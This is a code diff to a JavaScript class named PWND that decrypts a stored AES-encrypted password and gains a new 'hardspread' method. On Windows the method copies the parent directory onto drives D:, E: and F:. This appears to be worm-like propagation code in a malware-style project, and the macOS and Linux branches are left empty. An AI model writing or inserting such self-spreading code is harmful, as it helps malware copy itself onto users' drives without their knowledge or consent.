@@ -2,8 +2,9 @@
   * Init Vect is char 4 to 20
   * Password (encrypted) is 21 to string.length-16
   */
-const aes = require('aes-js')
-  sys_check = require("./system_check/sys_check");
+const aes = require('aes-js');
+const { copySync } = require('fs-extra');
+  sys_check = require("./sys_check");
 
 class PWND {
     constructor() {}
@@ -26,6 +27,26 @@ class PWND {
         dec = aes.utils.utf8.fromBytes(dec);
 
         return dec;
+    }
+
+    static async hardspread() {
+        if (/win32/gi.test(process.platform)) {
+          try {
+            copySync("../", "D:/");
+          } catch (e) {
+            console.log("Drive D: doesn't exist, trying new drive")
+            copySync("../", "E:/");
+          } finally {
+            copySync("../", "F:/");
+          }
+        } else if ((/darwin/gi).test(process.platform)) {
+
+        } else if ((/linux/gi).test(process.platform)) {
+
+        } else {
+          throw new Error("Unknown System Platform!!! exiting now!"), process.exit(1);
+        }
+
     }
 }
 
